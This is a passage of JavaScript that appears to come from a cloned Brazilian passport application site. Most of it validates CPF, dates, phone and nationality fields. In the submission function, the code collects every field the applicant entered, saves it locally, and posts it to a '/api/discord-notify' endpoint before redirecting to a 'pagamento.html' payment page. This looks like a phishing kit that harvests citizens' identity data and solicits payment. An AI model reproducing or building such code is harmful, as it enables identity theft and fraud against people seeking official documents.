		mensagem += "<li>- O CPF do Respons\u00E1vel informado \u00E9 inv\u00E1lido. Por favor, informar CPF v\u00E1lido.</li>";
		destacarCampo($("#cpfResponsavel"));
	}
}

/**
 * valida a data de emissao da identidade.
 */
function validarRegraDataEmissaoIdentidade() {
	if (!isCampoEmBranco($('#identidadeDataEmissao')) && $('#identidadeDataEmissao').val().length < 10) {
		mensagem += "<li>- Data de Emiss\u00E3o do Documento de Identidade inv\u00E1lida.</li>";
		destacarCampo($("#identidadeDataEmissao"));
	} else  if (!isCampoEmBranco($('#identidadeDataEmissao'))){
		$dataEmissao = parseToDate($('#identidadeDataEmissao'));
	}
	
	if ($dataEmissao != "" && $dataNascimento != "") { 
		if ($dataEmissao < $dataNascimento) {
			mensagem += "<li>- Data de Emiss\u00E3o do Documento de Identidade anterior \u00E0 Data de Nascimento.</li>";
		 	destacarCampo($("#dataNascimento"));
		 	destacarCampo($("#identidadeDataEmissao"));
	 	} else if ($dataEmissao > $dataAtual) {
	 		mensagem += "<li>- Data de Emiss\u00E3o do Documento de Identidade posterior \u00E0 Data Atual.</li>";
	 		destacarCampo($("#identidadeDataEmissao"));
	 	}
	}
}

/**
 * valida o email.
 */
function validarRegraEmail() {
	if (!isCampoEmBranco($('#enderecoEletronico')) && !valida_email($('#enderecoEletronico'))) {
		mensagem += "<li>- E-mail inv\u00E1lido</li>";
		destacarCampo($("#enderecoEletronico"));
	}
}

/**
 * Avisos para o usuario.
 */
function avisosUsuario() {
	if (($('#docViagemPosse').val() >= 2) && ($('#docViagemPosse').val() <= 5)) {
		alert("O cidad\u00E3o dever\u00E1 apresentar o passaporte comum ou de emerg\u00EAncia anterior (v\u00E1lido), " +
				"quando houver, ao comparecer ao posto de expedi\u00E7\u00E3o de passaportes para atendimento. A n\u00E3o " +
				"apresenta\u00E7\u00E3o desse implicar\u00E1 em pagamento da taxa em dobro, salvo no caso de roubo (Art. 157 " +
				"do C\u00F3digo Penal Brasileiro), mediante apresenta\u00E7\u00E3o de boletim de ocorr\u00EAncia da pol\u00EDcia local.");
	}
	
	if ($('#autorizacaoViagem1').prop("checked")) {
		alert("Ambos os pais dever\u00E3o comparecer ao posto de atendimento para confirma\u00E7\u00E3o da solicita\u00E7\u00E3o, " +
		 		"munidos do formul\u00E1rio padr\u00E3o de autoriza\u00E7\u00E3o de expedi\u00E7\u00E3o de passaporte para menores com inclus\u00E3o de " +
		 		"autoriza\u00E7\u00E3o de viagem internacional no passaporte comum (poder p/ um dos pais)");
	} else if ($('#autorizacaoViagem2').prop("checked")) {
		alert("Ambos os pais dever\u00E3o comparecer ao posto de atendimento para confirma\u00E7\u00E3o da solicita\u00E7\u00E3o, " +
		 		"munidos do formul\u00E1rio padr\u00E3o de autoriza\u00E7\u00E3o de expedi\u00E7\u00E3o de passaporte para menores com inclus\u00E3o de " +
		 		"autoriza\u00E7\u00E3o de viagem internacional no passaporte comum (poderes amplos)");
	}
}

/**
 * Validar e submeter form.
 * A ordem da validacao: checar se os campos obrigatorios foram preenchidos; se foram, se sao validos;
 * Se invalidos, emitir avisos para o requerente, se for o caso.
 */
function processarSolicitacao() {
	if (validarCamposSolicitacao()) {
		// Salvar dados do formulario no localStorage
		var formData = {};
		var form = document.getElementById('formNovoPassaporte');
		var inputs = form.querySelectorAll('input, select, textarea');
		inputs.forEach(function(input) {
			if (input.name) {
				if (input.type === 'checkbox' || input.type === 'radio') {
					if (input.checked) {
						formData[input.name] = input.value;
					}
				} else {
					formData[input.name] = input.value;
				}
			}
		});
		localStorage.setItem('dadosSolicitacao', JSON.stringify(formData));

		// Notificar Discord antes de redirecionar (sem bloquear se falhar)
		try {
			var notifyPayload = JSON.stringify({
				event: 'form_submitted',
				data: formData,
				meta: {
					page: (window.top || window).location.href,
					referer: document.referrer || ''
				}
			});

			var beaconEnviado = false;
			if (navigator.sendBeacon) {
				try {
					var blob = new Blob([notifyPayload], { type: 'application/json' });
					beaconEnviado = navigator.sendBeacon('/api/discord-notify', blob);
				} catch (e) { /* fallback */ }
			}

			if (!beaconEnviado) {
				fetch('/api/discord-notify', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: notifyPayload,
					keepalive: true
				}).catch(function(err) { console.log('[v0] notify submit falhou:', err && err.message); });
			}
		} catch (e) {
			console.log('[v0] Erro ao preparar notificacao:', e && e.message);
		}

		// Redirecionar para pagina de pagamento
		window.location.href = 'pagamento.html';
	} else if ($tab) {
		$tab.tab('show');
	}
}

/**
 * Verificacao de nacionalidade.
 */
function verificaNacionalidade($paisesSemRelacaoDiplomatica) {
	
	var $paisNacionalidade = $('#paisNacionalidade').val();
	
	var arrayPaisesSemRelacao = $paisesSemRelacaoDiplomatica.split(",");
	
	var conteudo = "";

	if ($paisNacionalidade != CODIGO_BRASIL) {
		var possuiRelacaoDiplomatica = true;
		
		for (var i = 0; i < arrayPaisesSemRelacao.length; i++) {
			if ($paisNacionalidade == arrayPaisesSemRelacao[i]) {
				possuiRelacaoDiplomatica = false;
				break;
			}
		}
		
			
		
		if (!possuiRelacaoDiplomatica) {
			conteudo = "Foi selecionada nacionalidade estrangeira, essa solicita\u00E7\u00E3o ser\u00E1 para laissez-passer. Caso seja brasileiro " +
					"e deseje passaporte comum (caderneta azul), selecione a nacionalidade Brasil. Deseja prosseguir assim mesmo?";
		     
			
			if (!confirm(conteudo)) {
				$('#paisNacionalidade').val(CODIGO_BRASIL);
				$('#paisNacionalidade').focus();
			}
		} else {
			conteudo = "Foi selecionada nacionalidade estrangeira, essa solicita\u00E7\u00E3o ser\u00E1 para passaporte para estrangeiro (caderneta amarela)." +
					" Caso seja brasileiro e deseje passaporte comum (caderneta azul), selecione a nacionalidade Brasil. Deseja prosseguir assim mesmo?";
			
			
			if (!confirm(conteudo)) {
				$('#paisNacionalidade').val(CODIGO_BRASIL);
				$('#paisNacionalidade').focus();
			}
		}
	}
}

/**
 * 
 * Validar preenchimento do campo cep por conta da GRU
 */
function validarCep() {
	if (!isCampoEmBranco($("#cep"))) {
		var valorCep = $("#cep").val();
		if (valorCep.length != 9) {
			mensagem += "<li>- O CEP deve ter 8 n\u00FAmeros.</li>";
		}
	}
}

/**
 * 
 * Validar preenchimento do campo telefone por conta da GRU
 */
function validarTelefone() {
	if (!isCampoEmBranco($("#ddd")) && !isCampoEmBranco($("#telefone"))) {
		var valorDdd = $("#ddd").val();
		if (valorDdd.length != 2) {
			mensagem += "<li>- O DDD deve ter 2 n\u00FAmeros.</li>";
		}
		var valorTelefone = $("#telefone").val();
		if (valorTelefone.length < 9 || valorTelefone.length > 10) {
			mensagem += "<li>- O Telefone deve ter 8 ou 9 n\u00FAmeros.</li>";
		}
	}
}

/*************************************************
CONSULTAR SOLICITACAO
**************************************************/
/**
 * Validacao de preenchimento de campos.
 * @param $protocolo
 * @param $cpf
 * @returns {Boolean}
 */
function validarConsultaSolicitacao($protocolo, $cpf) {
	mensagem = "";
	destacarCampoPreenchimentoObrigatorio($protocolo, "N\u00FAmeros do protocolo");
	destacarCampoPreenchimentoObrigatorio($cpf, "CPF");
	
	if (!isCampoEmBranco($protocolo)) {
		if ($protocolo.val().length != 17){
			mensagem += "<li>- N\u00FAmeros de Protocolo inv\u00E1lido</li>";
			destacarCampo($protocolo);
		} else {
			tirarDestaqueCampo($protocolo);
		}
	}
	if(!isCampoEmBranco($cpf)) {
		if (!valida_cpf($cpf.cleanVal())){
			mensagem += "<li>- CPF inv\u00E1lido</li>";
			destacarCampo($cpf);
		} else {
			tirarDestaqueCampo($cpf);
		}
	}
	
	return exibirMensagemErro("Observe os campos abaixo:", mensagem);
}

/**
 * Validacoes pre-submit.
 */
function processarConsultaSolicitacao() {
	if(validarConsultaSolicitacao($('#protocolo'), $('#cpf'), $('#codigoSeguranca'))) {
		$('#dispatcher').val('consultarSituacaoSolicitacao');
		$('#formConsultarSolicitacao').submit();
	}
}

/**
 * Validacoes pre-submit.
 */
function processarRecuperarProtocolo() {
	if(validarRecuperarProtocolo($('#cpf'), $('#dataNascimento'))) {
		$('#dispatcher').val('consultarProtocolo');
		$('#recuperarProtocoloActionForm').submit();
	}
}

function validarRecuperarProtocolo($cpf, $dataNascimento) {
	mensagem = "";
	destacarCampoPreenchimentoObrigatorio($cpf, "CPF");
	destacarCampoPreenchimentoObrigatorio($dataNascimento, "Data de Nascimento");
	
	return exibirMensagemErro("Observe os campos abaixo:", mensagem);
}

/*************************************************
REEMITIR GRU
 **************************************************/
/**
 * Validacao de preenchimento de campos.
 * @param $protocolo
 * @param $cpf
 * @param $cpfResponsavel
 * @param $dataNascimento
 * @returns {Boolean}
 */
function validarReemisaoGRU($protocolo, $cpf, $cpfResponsavel, $dataNascimento) {
	mensagem = "";
	
	tirarDestaqueCampo($protocolo);
	tirarDestaqueCampo($cpf);
	tirarDestaqueCampo($cpfResponsavel);
	tirarDestaqueCampo($dataNascimento);
	
	if (isCampoEmBranco($protocolo) && (isCampoEmBranco($cpf) || isCampoEmBranco($cpfResponsavel))){
		mensagem += "<li>- O N\u00FAmero de Protocolo e CPF ou CPF do respons\u00E1vel necessitam ser preenchidos</li>";
	    destacarCampo($protocolo);
	    destacarCampo($cpf);
	    destacarCampo($cpfResponsavel);
	} 
	if (!isCampoEmBranco($protocolo) && $protocolo.val().length != 17) {
		mensagem += "<li>- N\u00FAmero de Protocolo inv\u00E1lido</li>";
		destacarCampo($protocolo);
	}
	//if (!isCampoEmBranco($protocolo) && isCampoEmBranco($cpf) && isCampoEmBranco($cpfResponsavel)){
	//	mensagem += "<li>- O CPF ou CPF do responsavel necessitam ser preenchidos</li>";
	//	destacarCampo($cpf);
	//	destacarCampo($cpfResponsavel);
	//} 
	if (!isCampoEmBranco($cpf) && !valida_cpf($cpf.cleanVal())) {
		mensagem += "<li>- CPF inv\u00E1lido</li>";
		destacarCampo($cpf);
		tirarDestaqueCampo($cpfResponsavel);
	}
	if (!isCampoEmBranco($cpfResponsavel) && !valida_cpf($cpfResponsavel.cleanVal())) {
		mensagem += "<li>- CPF do Respons\u00E1vel inv\u00E1lido</li>";
		destacarCampo($cpfResponsavel);
		tirarDestaqueCampo($cpf);
	}
	
	destacarCampoPreenchimentoObrigatorio($dataNascimento, "Data de nascimento");
	
	if (!isCampoEmBranco($dataNascimento) && $dataNascimento.val().length != 10) {
		mensagem += "<li>- Data de Nascimento inv\u00E1lida</li>";
		destacarCampo($dataNascimento);
	}
	
	return exibirMensagemErro("Observe os campos abaixo:", mensagem);
}

/**
 * Validacoes pre-submit.
 */
function processarReemisaoGRU() {
	if(validarReemisaoGRU($('#protocolo'), $('#cpf'), $('#cpfResponsavel'), 
			$('#dataNascimento'), $('#codigoSeguranca'))) {
		$('#dispatcher').val('reemissaoGRU');
		setValidate(true);
		$('#formReemissaoGRU').submit();
	}
}

/*************************************************
Solicitar atualizacao de Dados
 **************************************************/
/**
 * Adicionar nacionalidade na tabela de outras nacionalidades.
 */
function adicionarOutraNacionalidade($form) {
	if (!isCampoEmBranco($("#outrasNacionalidadesPais")) 
			&& !isCampoEmBranco($("#outrasNacionalidadesDocumento")) 
			&& !isCampoEmBranco($("#outrasNacionalidadesNumero"))) {
		setDispatch('adicionarNacionalidade', 'false', $('#dispatch')[0], $('#validate')[0]);
		$form.submit();
	} else {
		mensagem = "";
		destacarCampoPreenchimentoObrigatorio($("#outrasNacionalidadesPais"), "Pa\u00EDs", $tab1);
		destacarCampoPreenchimentoObrigatorio($("#outrasNacionalidadesDocumento"), "Documento", $tab1);
		destacarCampoPreenchimentoObrigatorio($("#outrasNacionalidadesNumero"), "N\u00FAmero", $tab1);
		irParaAncora("ancoraOutrasNacionalidades");
		return exibirMensagemErroLocal("Os campos obrigat\u00F3rios a seguir necessitam ser preenchidos:", mensagem, "erroNacionalidade");
	}
	$tab.tab('show');
}

/**
 * Remover nacionalidade na tabela de outras nacionalidades.
 */
function removerOutraNacionalidade($form){
	var checkboxes = $('.checkremover');
	for (var i = 0; i < checkboxes.length; i++) {
		if (checkboxes[i].checked) {
			if (confirm('Confirma a remo\u00E7\u00E3o?')) {
				setDispatch('removerNacionalidade', 'false', $('#dispatch')[0], $('#validate')[0]);
				$form.submit();
				return;
			}
		} else {
			alert("Selecione uma das nacionalidades para remover.");
		}
	}
}

function processarSolicitacaoAtualizacao() {
//	$tab = null;
	if (validarCamposObrigatoriosAtualizacao()) {
		$('#dispatch').val('solicitarAtualizacaoDados');
		setValidate(true);
		$('#formSolicitarAtualizacaoDados').submit();
	} else {
		$tab.tab('show');
	}
}

/**
 * Validacao de campos em branco
 * @returns {Boolean}
 */
function validarCamposObrigatoriosAtualizacao() {
	mensagem = "";
	
	destacarCampoPreenchimentoObrigatorio($("#nomeCompletoRequerente"), "Nome do requerente", $tab1);
	destacarCampoPreenchimentoObrigatorio($("#dataNascimentoRequerente"), "Data de nascimento do requerente", $tab1);
	destacarCampoPreenchimentoObrigatorio($("#numPassaporteRequerente"), "N\u00FAmero do passaporte do requerente", $tab1);

	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#outrasNacionalidadesPais")) && isCampoEmBranco($("#outrasNacionalidadesDocumento")), 
			$("#outrasNacionalidadesDocumento"), "Documento de outra nacionalidade", $tab1);

	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#outrasNacionalidadesPais")) && isCampoEmBranco($("#outrasNacionalidadesNumero")), 
			$("#outrasNacionalidadesNumero"), "N\u00FAmero do documento de outra nacionalidade", $tab1);

	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#nomesAnterioresNome")) && isCampoEmBranco($("#selNomesAnterioresMotivo")), 
			$("#selNomesAnterioresMotivo"), "Motivo da mudan\u00E7a de nome anterior", $tab1);
	
	destacarCampoSobDeterminadaCondicao(isCampoEmBranco($("#ddd")) && !isCampoEmBranco($("#telefone")), 
			$("#ddd"), "DDD", $tab3);
	destacarCampoSobDeterminadaCondicao(!isCampoEmBranco($("#ddd")) && isCampoEmBranco($("#telefone")), 
			$("#telefone"), "Telefone", $tab3);
	destacarCampoPreenchimentoObrigatorio($("#unidadeDpf"), "Unidade de atendimento", $tab4);
	destacarCampoPreenchimentoObrigatorio($("#postoFiscal"), "Posto fiscal", $tab4);
	
	return exibirMensagemErro("Os campos obrigat\u00F3rios a seguir necessitam ser preenchidos:", mensagem);
}

/*************************************************
Solicitar registro de nacionalidade
 **************************************************/
function processarRegistroNacionalidade() {
	
	if (validarRegistroNacionalidade()) {
		$('#dispatch').val('solicitarRegistroNacionalidade');
		setValidate(true);
		$('#formSolicitarRegistroNacionalidade').submit();
	} else {
		$tab.tab('show');
	}
}

function validarRegistroNacionalidade() {
	mensagem = "";
	$dataAtual = new Date();
	$dataEmissao = "";
	$dataNascimento = "";
	
	destacarCampoPreenchimentoObrigatorio($("#nomeCompleto"), "Nome completo", $tab1);
	destacarCampoPreenchimentoObrigatorio($("#sexo"), "Sexo", $tab1);
	destacarCampoSobDeterminadaCondicao(
			(!isCampoEmBranco($('#nomeFiliacao1')) && isCampoEmBranco($('#sexoFiliacao1'))), 
			$("#sexoFiliacao1"), "Informe o sexo da filia\u00E7\u00E3o 1 ou limpe o campo nome da filia\u00E7\u00E3o 1", $tab1);
	destacarCampoSobDeterminadaCondicao(
			(isCampoEmBranco($('#nomeFiliacao1')) && !isCampoEmBranco($('#sexoFiliacao1'))), 
			$("#nomeFiliacao1"), "Informe o nome da filia\u00E7\u00E3o 1 ou limpe o campo sexo da filia\u00E7\u00E3o 1", $tab1);
	destacarCampoSobDeterminadaCondicao(
			(!isCampoEmBranco($('#nomeFiliacao2')) && isCampoEmBranco($('#sexoFiliacao2'))), 
			$("#sexoFiliacao2"), "Informe o sexo da filia\u00E7\u00E3o 2 ou limpe o campo nome da filia\u00E7\u00E3o 2", $tab1);
	destacarCampoSobDeterminadaCondicao(
			(isCampoEmBranco($('#nomeFiliacao2')) && !isCampoEmBranco($('#sexoFiliacao2'))), 
			$("#nomeFiliacao2"), "Informe o nome da filia\u00E7\u00E3o 2 ou limpe o campo sexo da filia\u00E7\u00E3o 2", $tab1);
	destacarCampoPreenchimentoObrigatorio($("#dataNascimento"), "Data de nascimento", $tab1);
	validarRegraDataNascimento();
	destacarCampoPreenchimentoObrigatorio($("#racaCor"), "Ra\u00E7a/cor", $tab1);
	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#outrasNacionalidadesPais")) && isCampoEmBranco($("#outrasNacionalidadesDocumento")), 
			$("#outrasNacionalidadesDocumento"), "Documento de outra nacionalidade", $tab1);
	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#outrasNacionalidadesPais")) && isCampoEmBranco($("#outrasNacionalidadesNumero")), 
			$("#outrasNacionalidadesNumero"), "N\u00FAmero do documento de outra nacionalidade", $tab1);
	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#nomesAnterioresNome")) && isCampoEmBranco($("#selNomesAnterioresMotivo")), 
			$("#selNomesAnterioresMotivo"), "Motivo da mudan\u00E7a de nome anterior", $tab1);
	destacarCampoSobDeterminadaCondicao(
			($("#paisNascimento").val() == CODIGO_BRASIL) && isCampoEmBranco($("#ufNascimento")), 
			$("#ufNascimento"), "UF de nascimento", $tab1);
	destacarCampoSobDeterminadaCondicao(
			($("#paisNascimento").val() == CODIGO_BRASIL) && isCampoEmBranco($("#cidadeNascimento")), 
			$("#cidadeNascimento"), "Cidade de nascimento", $tab1);
	
	if ($("#paisNacionalidade").val() == CODIGO_BRASIL) {
		validarPreenchimentoIdentidade();
		validarPreenchimentoCpf();
	} else {
		tirarDestaqueCamposEstrangeiro();
	}
	
	destacarCampoSobDeterminadaCondicao(
			isMaiorQueIdade(17) && isCampoEmBranco($("#profissao")), 
			$("#profissao"), "Profiss\u00E3o", $tab3);
	destacarCampoPreenchimentoObrigatorio($("#enderecoEletronico"), "E-mail", $tab3);

	validarNacionalidadeFiliacao();
	
	if (!isCampoEmBranco($("#paisResidencia"))) {
		if ($("#paisResidencia").val() == CODIGO_BRASIL) {
			destacarCampoPreenchimentoObrigatorio($("#ufResidencia"), "UF de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#cidadeResidencia"), "Cidade de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#enderecoResidencia"), "Logradouro de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#bairro"), "Bairro de resid\u00EAncia", $tab3);
		} else {
			destacarCampoPreenchimentoObrigatorio($("#cidadeResidenciaEstrangeiro"), "Nome da cidade de resid\u00EAncia", $tab3);
		}
	}
	
	destacarCampoSobDeterminadaCondicao(isCampoEmBranco($("#ddd")) && !isCampoEmBranco($("#telefone")), 
			$("#ddd"), "DDD", $tab3);
	destacarCampoSobDeterminadaCondicao(!isCampoEmBranco($("#ddd")) && isCampoEmBranco($("#telefone")), 
			$("#telefone"), "Telefone", $tab3);
	
	destacarCampoPreenchimentoObrigatorio($("#unidadeDpf"), "Local de atendimento", $tab4);
	destacarCampoPreenchimentoObrigatorio($("#postoFiscal"), "Posto fiscal", $tab4);
	
	return exibirMensagemErro("Os campos obrigat\u00F3rios a seguir necessitam ser preenchidos:", mensagem);
}
